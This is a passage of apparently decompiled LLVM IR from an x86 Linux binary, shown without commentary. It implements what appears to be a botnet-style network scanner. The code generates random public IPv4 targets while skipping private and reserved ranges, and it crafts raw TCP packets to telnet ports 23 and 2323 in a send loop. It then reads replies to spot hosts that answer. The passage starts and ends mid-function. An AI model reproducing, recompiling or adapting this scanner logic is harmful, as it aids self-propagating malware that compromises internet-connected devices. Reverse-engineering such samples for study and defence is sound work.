  %v15_804dde3 = icmp eq i32 %v3_804dde3, %v0_804dddd
  br i1 %v15_804dde3, label %dec_label_pc_804e12b, label %dec_label_pc_804dded

dec_label_pc_804dded:                             ; preds = %.loopexit
  %v1_804dded = add i32 %v0_804dde3, 1812
  store i32 %v1_804dded, i32* @ebp, align 4
  %v1_804ddf4 = add i32 %v0_804dde3, 1852
  %v2_804ddf4 = inttoptr i32 %v1_804ddf4 to i32*
  store i32 0, i32* %v2_804ddf4, align 4
  %v0_804dfef.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dfef

dec_label_pc_804de04:                             ; preds = %dec_label_pc_804e063
  switch i8 %v2_804e046, label %dec_label_pc_804de1f [
    i8 -84, label %dec_label_pc_804e0b0
    i8 100, label %dec_label_pc_804de0d.dec_label_pc_804e07a_crit_edge
    i8 -87, label %dec_label_pc_804e0cb
  ]

dec_label_pc_804de0d.dec_label_pc_804e07a_crit_edge: ; preds = %dec_label_pc_804de04
  %.pre = trunc i32 %v2_804e03d to i8
  br label %dec_label_pc_804e07a

dec_label_pc_804de16:                             ; preds = %dec_label_pc_804e071
  %v11_804de16 = icmp eq i8 %v2_804e046, -87
  br i1 %v11_804de16, label %dec_label_pc_804e0cb, label %dec_label_pc_804de1f

dec_label_pc_804de1f:                             ; preds = %dec_label_pc_804de04, %dec_label_pc_804e0c2, %dec_label_pc_804de16
  %v0_804de1f = phi i32 [ %v0_804e0c2, %dec_label_pc_804e0c2 ], [ %v5_804e03b, %dec_label_pc_804de16 ], [ %v5_804e03b, %dec_label_pc_804de04 ]
  %v0_804de3664 = phi i32 [ %v0_804e0b9, %dec_label_pc_804e0c2 ], [ %v2_804e03d, %dec_label_pc_804de16 ], [ %v2_804e03d, %dec_label_pc_804de04 ]
  %v1_804de1f = trunc i32 %v0_804de1f to i8
  %v11_804de1f = icmp eq i8 %v1_804de1f, -58
  br i1 %v11_804de1f, label %dec_label_pc_804e091, label %dec_label_pc_804de28

dec_label_pc_804de28:                             ; preds = %dec_label_pc_804e0cb, %dec_label_pc_804e088, %dec_label_pc_804de1f
  %v0_804de28 = phi i32 [ %v0_804de2871, %dec_label_pc_804e0cb ], [ %v5_804e03b, %dec_label_pc_804e088 ], [ %v0_804de1f, %dec_label_pc_804de1f ]
  %v0_804de3663 = phi i32 [ %v0_804e0cb, %dec_label_pc_804e0cb ], [ %v2_804e03d, %dec_label_pc_804e088 ], [ %v0_804de3664, %dec_label_pc_804de1f ]
  %v1_804de28 = trunc i32 %v0_804de28 to i8
  %tmp289 = icmp ult i8 %v1_804de28, -32
  br i1 %tmp289, label %dec_label_pc_804de31, label %dec_label_pc_804e030.preheader

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804e07a, %dec_label_pc_804e091, %dec_label_pc_804e0b0.dec_label_pc_804de31_crit_edge, %dec_label_pc_804de28
  %v0_804def4 = phi i32 [ %v0_804e0b9, %dec_label_pc_804e0b0.dec_label_pc_804de31_crit_edge ], [ %v0_804de3663, %dec_label_pc_804de28 ], [ %v0_804e09a, %dec_label_pc_804e091 ], [ %v2_804e03d, %dec_label_pc_804e07a ]
  %v0_804df02 = phi i32 [ %v0_804de31.pre, %dec_label_pc_804e0b0.dec_label_pc_804de31_crit_edge ], [ %v0_804de28, %dec_label_pc_804de28 ], [ %v0_804de3160, %dec_label_pc_804e091 ], [ %v5_804e03b, %dec_label_pc_804e07a ]
  %v1_804de31 = trunc i32 %v0_804df02 to i8
  %v10_804de31 = icmp eq i8 %v1_804de31, 106
  %tmp290 = and i32 %v0_804def4, 252
  %switch = icmp eq i32 %tmp290, 184
  %or.cond182 = and i1 %switch, %v10_804de31
  br i1 %or.cond182, label %dec_label_pc_804e030.preheader, label %dec_label_pc_804de5a

dec_label_pc_804de5a:                             ; preds = %dec_label_pc_804de31
  switch i8 %v1_804de31, label %dec_label_pc_804de7e [
    i8 -106, label %dec_label_pc_804e0d9
    i8 49, label %dec_label_pc_804e0f9
    i8 -78, label %dec_label_pc_804e0eb
    i8 -96, label %dec_label_pc_804e10b
  ]

dec_label_pc_804de7e:                             ; preds = %dec_label_pc_804e0f9, %dec_label_pc_804e0d9, %dec_label_pc_804de5a, %dec_label_pc_804e10b, %dec_label_pc_804e0eb
  %v1_804de7e = add i32 %v0_804df02, -6
  store i32 %v1_804de7e, i32* %eax.global-to-local, align 4
  %v1_804de81 = trunc i32 %v1_804de7e to i8
  %tmp291 = or i8 %v1_804de81, 1
  %tmp292 = icmp eq i8 %tmp291, 1
  br i1 %tmp292, label %dec_label_pc_804e030.preheader, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804de7e
  switch i8 %v1_804de31, label %dec_label_pc_804deec [
    i8 -41, label %dec_label_pc_804e030.preheader
    i8 -42, label %dec_label_pc_804e030.preheader
    i8 55, label %dec_label_pc_804e030.preheader
    i8 33, label %dec_label_pc_804e030.preheader
    i8 30, label %dec_label_pc_804e030.preheader
    i8 29, label %dec_label_pc_804e030.preheader
    i8 28, label %dec_label_pc_804e030.preheader
    i8 26, label %dec_label_pc_804e030.preheader
    i8 22, label %dec_label_pc_804e030.preheader
    i8 21, label %dec_label_pc_804e030.preheader
    i8 11, label %dec_label_pc_804e030.preheader
  ]

dec_label_pc_804deec:                             ; preds = %switch.early.test
  %v0_804deee = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805310a.10 to i16*), align 4
  %v1_804def4 = mul i32 %v0_804def4, 65536
  %v2_804deff = and i32 %v1_804def4, 16711680
  %v2_804df02 = mul i32 %v0_804df02, 16777216
  %v1_804deee = mul i32 %v0_804deee, 256
  %v2_804df08 = or i32 %v2_804deff, %v2_804df02
  %v0_804df0a = load i32, i32* @edi, align 4
  %v1_804df0c = urem i32 %v0_804df0a, 256
  store i32 %v1_804df0c, i32* %eax.global-to-local, align 4
  %v2_804df11 = or i32 %v1_804df0c, %v2_804df08
  store i32 %v2_804df11, i32* %ecx.global-to-local, align 4
  %v2_804df13 = or i32 %v1_804df0c, %v1_804deee
  %v1_804df15 = load i32, i32* @esp, align 4
  %v2_804df15 = add i32 %v1_804df15, -4
  %v3_804df15 = inttoptr i32 %v2_804df15 to i32*
  store i32 %v2_804df11, i32* %v3_804df15, align 4
  %v1_804df16 = trunc i32 %v2_804df13 to i16
  %v2_804df16 = call i16 @llvm.bswap.i16(i16 %v1_804df16)
  %v3_804df16 = zext i16 %v2_804df16 to i32
  %v1_804df1a = udiv i32 %v2_804df08, 65536
  %v2_804df1a = mul nuw i32 %v3_804df16, 65536
  %v1_804df1d = trunc i32 %v1_804df1a to i16
  %v2_804df1d = call i16 @llvm.bswap.i16(i16 %v1_804df1d)
  %v3_804df1d = zext i16 %v2_804df1d to i32
  %v6_804df1d = or i32 %v2_804df1a, %v3_804df1d
  store i32 %v6_804df1d, i32* %edx.global-to-local, align 4
  %v0_804df21 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804df21 = add i32 %v1_804df15, -8
  %v3_804df21 = inttoptr i32 %v2_804df21 to i32*
  store i32 %v0_804df21, i32* %v3_804df21, align 4
  %v0_804df22 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804df22, i32* @global_var_8053110.11, align 16
  %v1_804df28 = add i32 %v1_804df15, -12
  %v2_804df28 = inttoptr i32 %v1_804df28 to i32*
  store i32 20, i32* %v2_804df28, align 4
  %v1_804df2a = add i32 %v1_804df15, -16
  %v2_804df2a = inttoptr i32 %v1_804df2a to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804df2a, align 4
  %v0_804df2f = call i32 @function_804bd90()
  %v1_804df2f = trunc i32 %v0_804df2f to i16
  store i32 %v0_804df2f, i32* %eax.global-to-local, align 4
  %v0_804df34 = load i32, i32* @esp, align 4
  %v1_804df34 = add i32 %v0_804df34, 1868
  %v2_804df34 = inttoptr i32 %v1_804df34 to i32*
  %v3_804df34 = load i32, i32* %v2_804df34, align 4
  store i16 %v1_804df2f, i16* bitcast (i32* @global_var_805310a.10 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804df4a = ashr i32 %v3_804df34, 31
  %v2_804df50 = zext i32 %v3_804df34 to i64
  %v4_804df50 = zext i32 %v2_804df4a to i64
  %v5_804df50 = mul nuw i64 %v4_804df50, 4294967296
  %v6_804df50 = or i64 %v5_804df50, %v2_804df50
  %v10_804df50 = srem i64 %v6_804df50, 10
  %v11_804df50 = trunc i64 %v10_804df50 to i32
  store i32 %v11_804df50, i32* %edx.global-to-local, align 4
  %v1_804df52 = icmp eq i32 %v11_804df50, 0
  %v1_804df54 = icmp eq i1 %v1_804df52, false
  %. = select i1 %v1_804df54, i16 5888, i16 4873
  store i16 %., i16* @global_var_8053116.13, align 2
  %v0_804df63 = load i32, i32* @global_var_8053110.11, align 16
  store i32 %v0_804df63, i32* %eax.global-to-local, align 4
  %v1_804df68 = add i32 %v0_804df34, 12
  %v2_804df68 = inttoptr i32 %v1_804df68 to i32*
  store i32 20, i32* %v2_804df68, align 4
  %v0_804df6a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804df6a, i32* @global_var_8053118.14, align 8
  %v1_804df6f = add i32 %v0_804df34, 8
  %v2_804df6f = inttoptr i32 %v1_804df6f to i32*
  store i32 5120, i32* %v2_804df6f, align 4
  store i16 0, i16* bitcast (i32* @global_var_8053124.15 to i16*), align 4
  %v1_804df7d = add i32 %v0_804df34, 4
  %v2_804df7d = inttoptr i32 %v1_804df7d to i32*
  store i32 ptrtoint (i32* @global_var_8053114.16 to i32), i32* %v2_804df7d, align 4
  %v2_804df82 = inttoptr i32 %v0_804df34 to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804df82, align 4
  %v0_804df87 = call i32 @function_804bde0()
  %v1_804df87 = trunc i32 %v0_804df87 to i16
  store i16 %v1_804df87, i16* bitcast (i32* @global_var_8053124.15 to i16*), align 4
  %v0_804df92 = load i32, i32* @global_var_8053110.11, align 16
  store i32 %v0_804df92, i32* %eax.global-to-local, align 4
  %v1_804df97 = load i32, i32* @esp, align 4
  %v2_804df97 = add i32 %v1_804df97, 1832
  %v3_804df97 = inttoptr i32 %v2_804df97 to i32*
  store i32 %v0_804df92, i32* %v3_804df97, align 4
  %v0_804df9e = load i16, i16* @global_var_8053116.13, align 2
  %v1_804df9e = zext i16 %v0_804df9e to i32
  %v2_804df9e = load i32, i32* %eax.global-to-local, align 4
  %v3_804df9e = and i32 %v2_804df9e, -65536
  %v4_804df9e = or i32 %v3_804df9e, %v1_804df9e
  store i32 %v4_804df9e, i32* %eax.global-to-local, align 4
  %v0_804dfa4 = load i32, i32* @esp, align 4
  %v1_804dfa4 = add i32 %v0_804dfa4, 1828
  %v2_804dfa4 = inttoptr i32 %v1_804dfa4 to i16*
  store i16 2, i16* %v2_804dfa4, align 2
  %v0_804dfae = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfae = trunc i32 %v0_804dfae to i16
  %v2_804dfae = load i32, i32* @esp, align 4
  %v3_804dfae = add i32 %v2_804dfae, 1830
  %v4_804dfae = inttoptr i32 %v3_804dfae to i16*
  store i16 %v1_804dfae, i16* %v4_804dfae, align 2
  %v0_804dfb6 = load i32, i32* @esp, align 4
  %v1_804dfb6 = inttoptr i32 %v0_804dfb6 to i32*
  %v3_804dfb6 = add i32 %v0_804dfb6, 4
  %v0_804dfb7 = load i32, i32* @global_var_805317c.17, align 4
  store i32 %v0_804dfb7, i32* %eax.global-to-local, align 4
  %v1_804dfbc = inttoptr i32 %v3_804dfb6 to i32*
  %v2_804dfbc = load i32, i32* %v1_804dfbc, align 4
  store i32 %v2_804dfbc, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804dfbc, align 4
  %v0_804dfbf = load i32, i32* @ebp, align 4
  store i32 %v0_804dfbf, i32* %v1_804dfb6, align 4
  %v1_804dfc0 = add i32 %v0_804dfb6, -4
  %v2_804dfc0 = inttoptr i32 %v1_804dfc0 to i32*
  store i32 16384, i32* %v2_804dfc0, align 4
  %v1_804dfc5 = add i32 %v0_804dfb6, -8
  %v2_804dfc5 = inttoptr i32 %v1_804dfc5 to i32*
  store i32 40, i32* %v2_804dfc5, align 4
  %v1_804dfc7 = add i32 %v0_804dfb6, -12
  %v2_804dfc7 = inttoptr i32 %v1_804dfc7 to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804dfc7, align 4
  %v0_804dfcc = load i32, i32* %eax.global-to-local, align 4
  %v2_804dfcc = add i32 %v0_804dfb6, -16
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v0_804dfcc, i32* %v3_804dfcc, align 4
  %v0_804dfcd = call i32 @function_8050474()
  store i32 %v0_804dfcd, i32* %eax.global-to-local, align 4
  %v0_804dfd2 = load i32, i32* @esp, align 4
  %v1_804dfd2 = add i32 %v0_804dfd2, 1884
  %v2_804dfd2 = inttoptr i32 %v1_804dfd2 to i32*
  %v3_804dfd2 = load i32, i32* %v2_804dfd2, align 4
  %v1_804dfd9 = add i32 %v3_804dfd2, 1
  store i32 %v1_804dfd9, i32* %eax.global-to-local, align 4
  store i32 %v1_804dfd9, i32* %v2_804dfd2, align 4
  %v0_804dfe1 = load i32, i32* @esp, align 4
  %v1_804dfe1 = add i32 %v0_804dfe1, 32
  %v0_804dfe4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfe4 = add i32 %v0_804dfe4, -383
  %v6_804dfe4 = sub i32 382, %v0_804dfe4
  %v7_804dfe4 = and i32 %v6_804dfe4, %v0_804dfe4
  %v8_804dfe4 = icmp slt i32 %v7_804dfe4, 0
  %v9_804dfe4 = icmp eq i32 %v1_804dfe4, 0
  %v10_804dfe4 = icmp slt i32 %v1_804dfe4, 0
  %v3_804dfe9 = icmp eq i1 %v10_804dfe4, %v8_804dfe4
  %v4_804dfe9 = icmp eq i1 %v9_804dfe4, false
  %v5_804dfe9 = and i1 %v4_804dfe9, %v3_804dfe9
  br i1 %v5_804dfe9, label %dec_label_pc_804e127, label %dec_label_pc_804dfef

dec_label_pc_804dfef:                             ; preds = %dec_label_pc_804deec, %dec_label_pc_804dded
  %v0_804dfef = phi i32 [ %v1_804dfe1, %dec_label_pc_804deec ], [ %v0_804dfef.pre, %dec_label_pc_804dded ]
  %v1_804dfef = add i32 %v0_804dfef, 1812
  %v2_804dfef = inttoptr i32 %v1_804dfef to i32*
  store i32 0, i32* %v2_804dfef, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  %v1_804dffa = add i32 %v0_804dffa, 1816
  %v2_804dffa = inttoptr i32 %v1_804dffa to i32*
  store i32 0, i32* %v2_804dffa, align 4
  %v0_804e005 = load i32, i32* @esp, align 4
  %v1_804e005 = add i32 %v0_804e005, 1820
  %v2_804e005 = inttoptr i32 %v1_804e005 to i32*
  store i32 0, i32* %v2_804e005, align 4
  %v0_804e010 = load i32, i32* @esp, align 4
  %v1_804e010 = add i32 %v0_804e010, 1824
  %v2_804e010 = inttoptr i32 %v1_804e010 to i32*
  store i32 0, i32* %v2_804e010, align 4
  %v0_804e01b = call i32 @function_804d6c0()
  %v1_804e01b = trunc i32 %v0_804e01b to i16
  store i16 %v1_804e01b, i16* bitcast (i32* @global_var_8053104.18 to i16*), align 4
  %v0_804e026 = load i32, i32* @global_var_805315c.19, align 4
  store i32 %v0_804e026, i32* %eax.global-to-local, align 4
  store i32 %v0_804e026, i32* @global_var_805310c.20, align 4
  br label %dec_label_pc_804e030.preheader

dec_label_pc_804e030.preheader:                   ; preds = %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804de7e, %dec_label_pc_804de31, %dec_label_pc_804e091, %dec_label_pc_804dfef, %dec_label_pc_804e0b9, %dec_label_pc_804e0d9, %dec_label_pc_804e0f9, %dec_label_pc_804de28, %dec_label_pc_804e0cb, %dec_label_pc_804e0eb, %dec_label_pc_804e10b
  br label %dec_label_pc_804e030

dec_label_pc_804e030:                             ; preds = %switch.early.test288, %switch.early.test288, %dec_label_pc_804e052, %dec_label_pc_804e030, %dec_label_pc_804e030, %dec_label_pc_804e030, %dec_label_pc_804e083, %dec_label_pc_804e06c, %dec_label_pc_804e030.preheader
  %v0_804e030 = call i32 @function_804d6c0()
  store i32 %v0_804e030, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804e030, 65536
  %v1_804e035 = sdiv i32 %sext, 65536
  %v2_804e03b = urem i32 %v0_804e030, 256
  %v3_804e03b = load i32, i32* @ecx, align 4
  %v4_804e03b = and i32 %v3_804e03b, -256
  %v5_804e03b = or i32 %v4_804e03b, %v2_804e03b
  store i32 %v5_804e03b, i32* @ecx, align 4
  %v2_804e03d = udiv i32 %v1_804e035, 256
  store i32 %v2_804e03d, i32* @ebx, align 4
  %v2_804e040 = udiv i32 %v1_804e035, 65536
  store i32 %v2_804e040, i32* @edx, align 4
  %v2_804e043 = udiv i32 %v1_804e035, 16777216
  store i32 %v2_804e043, i32* @edi, align 4
  %v2_804e046 = trunc i32 %v0_804e030 to i8
  switch i8 %v2_804e046, label %dec_label_pc_804e052 [
    i8 127, label %dec_label_pc_804e030
    i8 0, label %dec_label_pc_804e030
    i8 3, label %dec_label_pc_804e030
  ]

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e030
  %v2_804e052 = add nsw i32 %v1_804e035, -15
  store i32 %v2_804e052, i32* %eax.global-to-local, align 4
  %v1_804e055 = trunc i32 %v2_804e052 to i8
  %tmp293 = or i8 %v1_804e055, 1
  %tmp294 = icmp eq i8 %tmp293, 1
  br i1 %tmp294, label %dec_label_pc_804e030, label %switch.early.test288

switch.early.test288:                             ; preds = %dec_label_pc_804e052
  switch i8 %v2_804e046, label %dec_label_pc_804e063 [
    i8 56, label %dec_label_pc_804e030
    i8 10, label %dec_label_pc_804e030
  ]

dec_label_pc_804e063:                             ; preds = %switch.early.test288
  %v8_804e063 = icmp eq i8 %v2_804e046, -64
  %v1_804e066 = icmp eq i1 %v8_804e063, false
  br i1 %v1_804e066, label %dec_label_pc_804de04, label %dec_label_pc_804e06c

dec_label_pc_804e06c:                             ; preds = %dec_label_pc_804e063
  %v1_804e06c = trunc i32 %v2_804e03d to i8
  %v11_804e06c = icmp eq i8 %v1_804e06c, -88
  br i1 %v11_804e06c, label %dec_label_pc_804e030, label %dec_label_pc_804e071

dec_label_pc_804e071:                             ; preds = %dec_label_pc_804e06c
  %v10_804e071 = icmp eq i8 %v2_804e046, 100
  %v1_804e074 = icmp eq i1 %v10_804e071, false
  br i1 %v1_804e074, label %dec_label_pc_804de16, label %dec_label_pc_804e07a

dec_label_pc_804e07a:                             ; preds = %dec_label_pc_804de0d.dec_label_pc_804e07a_crit_edge, %dec_label_pc_804e071
  %v1_804e07a.pre-phi = phi i8 [ %.pre, %dec_label_pc_804de0d.dec_label_pc_804e07a_crit_edge ], [ %v1_804e06c, %dec_label_pc_804e071 ]
  %tmp295 = icmp ult i8 %v1_804e07a.pre-phi, 64
  br i1 %tmp295, label %dec_label_pc_804de31, label %dec_label_pc_804e083

dec_label_pc_804e083:                             ; preds = %dec_label_pc_804e07a
  %tmp296 = icmp ult i8 %v1_804e07a.pre-phi, 127
  br i1 %tmp296, label %dec_label_pc_804e030, label %dec_label_pc_804e088

dec_label_pc_804e088:                             ; preds = %dec_label_pc_804e083
  %v11_804e088 = icmp eq i8 %v2_804e046, -58
  %v1_804e08b = icmp eq i1 %v11_804e088, false
  br i1 %v1_804e08b, label %dec_label_pc_804de28, label %dec_label_pc_804e091

dec_label_pc_804e091:                             ; preds = %dec_label_pc_804e088, %dec_label_pc_804de1f
  %v0_804e09a = phi i32 [ %v2_804e03d, %dec_label_pc_804e088 ], [ %v0_804de3664, %dec_label_pc_804de1f ]
  %v0_804de3160 = phi i32 [ %v5_804e03b, %dec_label_pc_804e088 ], [ %v0_804de1f, %dec_label_pc_804de1f ]
  %v1_804e091 = trunc i32 %v0_804e09a to i8
  %tmp297 = icmp ugt i8 %v1_804e091, 17
  %tmp298 = or i8 %v1_804e091, 1
  %tmp299 = icmp eq i8 %tmp298, 19
  %or.cond162 = and i1 %tmp297, %tmp299
  br i1 %or.cond162, label %dec_label_pc_804e030.preheader, label %dec_label_pc_804de31

dec_label_pc_804e0a4:                             ; preds = %dec_label_pc_804eed7
  store i32 0, i32* %v2_804e0a7, align 4
  %v1_804e0a9 = call i32 @function_805182e(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e0a9, i32* %eax.global-to-local, align 4
  %v0_804e0b0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0b0

dec_label_pc_804e0b0:                             ; preds = %dec_label_pc_804de04, %dec_label_pc_804e0a4
  %v0_804e0b9 = phi i32 [ %v0_804e0b0.pre, %dec_label_pc_804e0a4 ], [ %v2_804e03d, %dec_label_pc_804de04 ]
  %v1_804e0b0 = trunc i32 %v0_804e0b9 to i8
  %tmp300 = icmp ult i8 %v1_804e0b0, 16
  br i1 %tmp300, label %dec_label_pc_804e0b0.dec_label_pc_804de31_crit_edge, label %dec_label_pc_804e0b9

dec_label_pc_804e0b0.dec_label_pc_804de31_crit_edge: ; preds = %dec_label_pc_804e0b0
  %v0_804de31.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804de31

dec_label_pc_804e0b9:                             ; preds = %dec_label_pc_804e0b0
  %tmp301 = icmp ult i8 %v1_804e0b0, 32
  br i1 %tmp301, label %dec_label_pc_804e030.preheader, label %dec_label_pc_804e0c2

dec_label_pc_804e0c2:                             ; preds = %dec_label_pc_804e0b9
  %v0_804e0c2 = load i32, i32* @ecx, align 4
  %v1_804e0c2 = trunc i32 %v0_804e0c2 to i8
  %v11_804e0c2 = icmp eq i8 %v1_804e0c2, -87
  %v1_804e0c5 = icmp eq i1 %v11_804e0c2, false
  br i1 %v1_804e0c5, label %dec_label_pc_804de1f, label %dec_label_pc_804e0cb

dec_label_pc_804e0cb:                             ; preds = %dec_label_pc_804de04, %dec_label_pc_804e0c2, %dec_label_pc_804de16
  %v0_804de2871 = phi i32 [ %v0_804e0c2, %dec_label_pc_804e0c2 ], [ %v5_804e03b, %dec_label_pc_804de16 ], [ %v5_804e03b, %dec_label_pc_804de04 ]
  %v0_804e0cb = phi i32 [ %v0_804e0b9, %dec_label_pc_804e0c2 ], [ %v2_804e03d, %dec_label_pc_804de16 ], [ %v2_804e03d, %dec_label_pc_804de04 ]
  %v1_804e0cb = trunc i32 %v0_804e0cb to i8
  %v11_804e0cb = icmp eq i8 %v1_804e0cb, -1
  %v1_804e0ce = icmp eq i1 %v11_804e0cb, false
  br i1 %v1_804e0ce, label %dec_label_pc_804de28, label %dec_label_pc_804e030.preheader

dec_label_pc_804e0d9:                             ; preds = %dec_label_pc_804de5a
  %v1_804e0d9 = trunc i32 %v0_804def4 to i8
  %v10_804e0d9 = icmp eq i8 %v1_804e0d9, 31
  br i1 %v10_804e0d9, label %dec_label_pc_804e030.preheader, label %dec_label_pc_804de7e

dec_label_pc_804e0eb:                             ; preds = %dec_label_pc_804de5a
  %.pre127 = trunc i32 %v0_804def4 to i8
  %v10_804e0eb = icmp eq i8 %.pre127, 62
  %v1_804e0ee = icmp eq i1 %v10_804e0eb, false
  br i1 %v1_804e0ee, label %dec_label_pc_804de7e, label %dec_label_pc_804e030.preheader

dec_label_pc_804e0f9:                             ; preds = %dec_label_pc_804de5a
  %v1_804e0f9 = trunc i32 %v0_804def4 to i8
  %v10_804e0f9 = icmp eq i8 %v1_804e0f9, 51
  br i1 %v10_804e0f9, label %dec_label_pc_804e030.preheader, label %dec_label_pc_804de7e

dec_label_pc_804e10b:                             ; preds = %dec_label_pc_804de5a
  %.pre126 = trunc i32 %v0_804def4 to i8
  %v10_804e10b = icmp eq i8 %.pre126, 13
  %v1_804e10e = icmp eq i1 %v10_804e10b, false
  br i1 %v1_804e10e, label %dec_label_pc_804de7e, label %dec_label_pc_804e030.preheader

dec_label_pc_804e127:                             ; preds = %dec_label_pc_804deec
  %v0_804e127 = load i32, i32* @esi, align 4
  %v2_804e127 = add i32 %v0_804dfe1, 48
  %v3_804e127 = inttoptr i32 %v2_804e127 to i32*
  store i32 %v0_804e127, i32* %v3_804e127, align 4
  br label %dec_label_pc_804e12b

dec_label_pc_804e12b:                             ; preds = %.loopexit, %dec_label_pc_804e127
  %v1_804e12b = call i32 @function_805021b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e12b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804e132 = load i32, i32* @esp, align 4
  %v2_804e132 = add i32 %v1_804e132, 24
  %v3_804e132 = inttoptr i32 %v2_804e132 to i32*
  store i32 %v1_804e12b, i32* %v3_804e132, align 4
  br label %dec_label_pc_804e136

dec_label_pc_804e136:                             ; preds = %dec_label_pc_804e191, %dec_label_pc_804e1d3, %dec_label_pc_804e1cb, %dec_label_pc_804e1c3, %dec_label_pc_804e1af, %dec_label_pc_804e1a3, %dec_label_pc_804e18a, %dec_label_pc_804e17e, %dec_label_pc_804e179, %dec_label_pc_804e235, %dec_label_pc_804e12b
  %v0_804e136 = load i32, i32* @esp, align 4
  %v1_804e136 = add i32 %v0_804e136, 24
  %v2_804e136 = inttoptr i32 %v1_804e136 to i32*
  %v3_804e136 = load i32, i32* %v2_804e136, align 4
  store i32 %v3_804e136, i32* %eax.global-to-local, align 4
  %v1_804e13a = inttoptr i32 %v3_804e136 to i32*
  store i32 0, i32* %v1_804e13a, align 4
  %v0_804e140 = load i32, i32* @edi, align 4
  %v1_804e140 = load i32, i32* @esp, align 4
  %v2_804e140 = add i32 %v1_804e140, -4
  %v3_804e140 = inttoptr i32 %v2_804e140 to i32*
  store i32 %v0_804e140, i32* %v3_804e140, align 4
  %v0_804e141 = load i32, i32* @edi, align 4
  %v2_804e141 = add i32 %v1_804e140, -8
  %v3_804e141 = inttoptr i32 %v2_804e141 to i32*
  store i32 %v0_804e141, i32* %v3_804e141, align 4
  %v1_804e142 = add i32 %v1_804e140, -12
  %v2_804e142 = inttoptr i32 %v1_804e142 to i32*
  store i32 0, i32* %v2_804e142, align 4
  %v1_804e144 = add i32 %v1_804e140, -16
  %v2_804e144 = inttoptr i32 %v1_804e144 to i32*
  store i32 0, i32* %v2_804e144, align 4
  %v1_804e146 = add i32 %v1_804e140, -20
  %v2_804e146 = inttoptr i32 %v1_804e146 to i32*
  store i32 16384, i32* %v2_804e146, align 4
  %v1_804e14b = add i32 %v1_804e140, -24
  %v2_804e14b = inttoptr i32 %v1_804e14b to i32*
  store i32 1514, i32* %v2_804e14b, align 4
  %v0_804e150 = load i32, i32* @global_var_805317c.17, align 4
  store i32 %v0_804e150, i32* %esi.global-to-local, align 4
  %v1_804e156 = add i32 %v1_804e140, 42
  store i32 %v1_804e156, i32* %edx.global-to-local, align 4
  %v2_804e15a = add i32 %v1_804e140, -28
  %v3_804e15a = inttoptr i32 %v2_804e15a to i32*
  store i32 %v1_804e156, i32* %v3_804e15a, align 4
  %v0_804e15b = load i32, i32* %esi.global-to-local, align 4
  %v2_804e15b = add i32 %v1_804e140, -32
  %v3_804e15b = inttoptr i32 %v2_804e15b to i32*
  store i32 %v0_804e15b, i32* %v3_804e15b, align 4
  %v0_804e15c = call i32 @function_80503fe()
  store i32 %v0_804e15c, i32* %eax.global-to-local, align 4
  %v0_804e161 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804e15c, 1
  br i1 %tmp, label %dec_label_pc_804e246, label %dec_label_pc_804e16c

dec_label_pc_804e16c:                             ; preds = %dec_label_pc_804e136
  %v1_804e16c = add i32 %v0_804e161, 56
  %v2_804e16c = inttoptr i32 %v1_804e16c to i32*
  %v3_804e16c = load i32, i32* %v2_804e16c, align 4
  store i32 %v3_804e16c, i32* %ecx.global-to-local, align 4
  %v1_804e170 = inttoptr i32 %v3_804e16c to i32*
  %v2_804e170 = load i32, i32* %v1_804e170, align 4
  %v11_804e170 = icmp eq i32 %v2_804e170, 11
  br i1 %v11_804e170, label %dec_label_pc_804e246, label %dec_label_pc_804e179

dec_label_pc_804e179:                             ; preds = %dec_label_pc_804e16c
  %tmp302 = icmp ult i32 %v0_804e15c, 40
  br i1 %tmp302, label %dec_label_pc_804e136, label %dec_label_pc_804e17e

dec_label_pc_804e17e:                             ; preds = %dec_label_pc_804e179
  %v1_804e17e = add i32 %v0_804e161, 90
  %v2_804e17e = inttoptr i32 %v1_804e17e to i32*
  %v3_804e17e = load i32, i32* %v2_804e17e, align 4
  store i32 %v3_804e17e, i32* %eax.global-to-local, align 4
  %v1_804e182 = load i32, i32* @global_var_805315c.19, align 4
  %v12_804e182 = icmp eq i32 %v3_804e17e, %v1_804e182
  %v1_804e188 = icmp eq i1 %v12_804e182, false
  br i1 %v1_804e188, label %dec_label_pc_804e136, label %dec_label_pc_804e18a

dec_label_pc_804e18a:                             ; preds = %dec_label_pc_804e17e
  %v1_804e18a = add i32 %v0_804e161, 83
  %v2_804e18a = inttoptr i32 %v1_804e18a to i8*
  %v3_804e18a = load i8, i8* %v2_804e18a, align 1
  %v12_804e18a = icmp eq i8 %v3_804e18a, 6
  %v1_804e18f = icmp eq i1 %v12_804e18a, false
  br i1 %v1_804e18f, label %dec_label_pc_804e136, label %dec_label_pc_804e191

dec_label_pc_804e191:                             ; preds = %dec_label_pc_804e18a
  %v1_804e191 = add i32 %v0_804e161, 94
  %v2_804e191 = inttoptr i32 %v1_804e191 to i32*
  %v3_804e191 = load i32, i32* %v2_804e191, align 4
  store i32 %v3_804e191, i32* %esi.global-to-local, align 4
